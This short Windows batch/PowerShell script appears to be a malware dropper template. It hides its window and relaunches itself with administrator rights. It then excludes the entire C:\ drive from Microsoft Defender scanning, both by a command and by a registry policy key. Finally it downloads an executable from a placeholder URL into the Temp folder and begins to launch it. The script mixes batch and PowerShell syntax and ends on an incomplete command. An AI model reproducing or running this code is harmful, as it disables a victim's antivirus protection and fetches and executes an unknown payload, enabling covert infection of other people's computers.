powershell -w h -command ""

if not "%1"=="am_admin" (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
    exit /b
)

powershell.exe -command "Add-MpPreference -ExclusionPath C:\"

powershell.exe reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v C:\==

$url = "rawlinkhere"
$output = "$env:Temp/Outputfile.exe"
iwr -Uri $url -OutFile $output
Start-Process -FilePath
